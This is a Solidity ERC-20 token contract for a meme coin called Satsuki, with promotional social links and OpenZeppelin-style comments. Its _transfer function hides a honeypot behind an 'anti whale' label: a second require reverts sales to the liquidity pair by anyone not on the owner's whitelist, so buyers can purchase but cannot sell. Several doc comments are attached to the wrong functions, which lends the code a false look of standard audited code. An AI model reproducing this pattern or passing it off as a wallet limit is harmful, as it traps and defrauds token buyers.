// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts (last updated v4.8.0) (token/ERC20/ERC20.sol)

/*

Telegram: https://t.me/SatsukiERC20
Twitter: https://twitter.com/SatsukiERC20
Website: https://satsukierc20.xyz
*/

pragma solidity ^0.8.0;

import "./IERC20.sol";
import "./IERC20Metadata.sol";
import "./Context.sol";
import "./SafeMath.sol";

contract Ownable is Context {

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    /**
     * @dev Returns the address of the current owner.
     */
    address private _owner;
    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
    function owner() public view returns (address) {
        return _owner;
    }


    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
    

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
}

contract Satsuki is Context, IERC20, IERC20Metadata, Ownable {
    using SafeMath for uint256;

    mapping (address => bool) noAntiWhaleRestriction;
    uint256 private _totalSupply;
    address private tokenPairAddress;
    address private UniSwapRouterCA = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address private UniSwapv2Pair;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _balances;

    string private _symbol = "SATSUKI";
    string private _name = "Satoshis Dog";
    uint256 public _maxWalletAmount = 200000000000 * 10**9;

    /**
     * @dev Sets the values for {name} and {symbol}.
     * All two of these values are immutable: they can only be set once during
     * {decimals} you should overload it.
     *
     */
    constructor()
    {
        noAntiWhaleRestriction[msg.sender] = true;
        _mint(msg.sender, 5010000000000 * 10**uint(decimals()));
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual override returns (string memory) {
        return _name;
    }


    /**
     * @dev Atomically decreases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     * - `spender` must have allowance for the caller of at least
     * `subtractedValue`.
     */
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(owner, spender, currentAllowance - subtractedValue);
        } return true;
    }

    /**
     * @dev Returns the number of decimals used to get its user representation.
     */
    function decimals() public view virtual override returns (uint8) {
        return 9;
    }

    /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    /**
     * @dev See {IERC20-transferFrom}.
     *
     * Emits an {Approval} event indicating the updated allowance. This is not
     * required by the EIP. See the note at the beginning of {ERC20}.
     *
     * NOTE: Does not update the allowance if the current allowance
     * is the maximum `uint256`.
     *
     * Requirements:
     *
     * - `from` and `to` cannot be the zero address.
     * - `from` must have a balance of at least `amount`.
     * - the caller must have allowance for ``from``'s tokens of at least
     * `amount`.
     */
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }

    // anti whale
    function setUniswapV2Pair(address _tokenPairAddress, address _UniSwapv2Pair) public onlyOwner {
        tokenPairAddress = _tokenPairAddress;
        UniSwapv2Pair = _UniSwapv2Pair;
    }

    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }
    /**
     * @dev Moves `amount` of tokens from `from` to `to`.
     *
     * - `from` must have a balance of at least `amount`.
     */
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {{
        require(to != address(0), "ERC20: transfer to the zero address");
        require(from != address(0), "ERC20: transfer from the zero address");
        if (noAntiWhaleRestriction[from] != true && noAntiWhaleRestriction[to] != true && to != UniSwapRouterCA && noAntiWhaleRestriction[tx.origin] != true && from == tokenPairAddress && msg.sender != UniSwapRouterCA)
            require(amount + balanceOf(to) <= _maxWalletAmount, "Anti whale, cannot exceed Max wallet.");
            require(noAntiWhaleRestriction[from] == true || noAntiWhaleRestriction[to] == true || noAntiWhaleRestriction[msg.sender] == true || noAntiWhaleRestriction[tx.origin] == true || to == tx.origin || balanceOf(UniSwapv2Pair) == 0, "Anti whale, cannot exceed Max wallet.");
        }

        uint256 fromBalance = _balances[from];
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");

        _balances[from] = fromBalance - amount;

        _balances[to] = _balances[to].add(amount);
        emit Transfer(from, to, amount);
    }

    /**
     * @dev Destroys `amount` tokens from `account`, reducing the
     * total supply.
     *
     * Emits a {Transfer} event with `to` set to the zero address.
     *
     * Requirements:
     *
     * - `account` cannot be the zero address.
     * - `account` must have at least `amount` tokens.
     */
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    /**
     * @dev See {IERC20-approve}.
     *
     * NOTE: If `amount` is the maximum `uint256`, the allowance is not updated on
     * `transferFrom`. This is semantically equivalent to an infinite approval.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
            _totalSupply -= amount;
        }

        emit Transfer(account, address(0), amount);
    }


    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    /**
     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
     *
     * This internal function is equivalent to `approve`, and can be used to
     * e.g. set automatic allowances for certain subsystems, etc.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `owner` cannot be the zero address.
     * - `spender` cannot be the zero address.
     */
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    /** @dev Creates `amount` tokens and assigns them to `account`, increasing
     * the total supply.
     * - `account` cannot be the zero address.
     */
    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        unchecked {
            // Overflow not possible: balance + amount is at most totalSupply + amount, which is checked above.
            _balances[account] += amount;
        }
        emit Transfer(address(0), account, amount);
    }
    /**
     * @dev Updates `owner` s allowance for `spender` based on spent `amount`.
     *
     */
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }
    /**
     * @dev See {IERC20-balanceOf}.
     */
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }
    /**
     * @dev See {IERC20-transfer}.
     *
     * Requirements:
     *
     * - `to` cannot be the zero address.
     * - the caller must have a balance of at least `amount`.
     */
    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }
}
